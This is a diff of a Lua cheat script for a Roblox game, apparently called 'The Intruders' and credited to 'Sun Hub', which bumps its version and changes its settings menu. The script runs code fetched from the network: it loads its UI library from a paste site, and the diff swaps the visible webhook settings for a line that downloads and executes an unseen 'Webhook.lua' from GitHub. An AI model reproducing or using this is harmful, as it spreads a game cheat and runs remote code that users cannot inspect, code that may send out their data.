@@ -218,7 +218,7 @@ local r = {"Easy", "Hard", "Nightmare", "Infinite"}
 local s = {"Capsule Series 1", "Raid Capsule", "Gear 5 Fluffy Capsule", "Esper Capsule"}
 local t = { "Tengoku Raid", "Hirito Raid", "Titan Raid", "Esper Raid" ,"Demon Lord Raid","Yomiichi Raid", "Christmas Raid","Combat Titan Raid", "Infinity Nojo Raid", "Gear 5 Fluffy Raid", "Red Emperor Raid", "Cursed Sage Raid"}
 local u = loadstring(game:HttpGet("https://www.klgrth.io/paste/gs77p/raw"))()
-local v = u:MakeWindow({Name = "The Intruders V0.4", HidePremium = true, IntroEnabled = false})
+local v = u:MakeWindow({Name = "The Intruders V0.5", HidePremium = true, IntroEnabled = false})
 local w = v:MakeTab({Name = "Main", PremiumOnly = false})
 local x = v:MakeTab({Name = "Extra", PremiumOnly = false})
 local D = v:MakeTab({Name = "TP Method", PremiumOnly = false})
@@ -2117,31 +2117,9 @@ D:AddSlider(
             saveSettings()
         end}
 )
-z:AddSlider(
-    {Name = "Send Delay", Default = _G.Settings.webhookspeed, Min = 10, Max = 10, Color = Color3.fromRGB(98, 0, 182), Callback = function(H)
-            _G.Settings.webhookspeed = H
-            saveSettings()
-        end}
-)
 
-z:AddTextbox(
-    {Name = "Put Your ID", Default = _G.Settings.dsuser, TextDisappear = false, Callback = function(H)
-            _G.Settings.dsuser = H
-            saveSettings()
-        end}
-)
 D:AddLabel("select behind recommend")
-z:AddTextbox(
-    {
-        Name = "Put @here or @everyone ",
-        Default = _G.Settings.otherds,
-        TextDisappear = false,
-        Callback = function(H)
-            _G.Settings.otherds = H
-            saveSettings()
-        end
-    }
-)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lifaiossama/errors/main/Webhook.lua"))()
 G:AddButton(
     {Name = "Script by Sun Hub", Callback = function()
             setclipboard("Sun Hub")
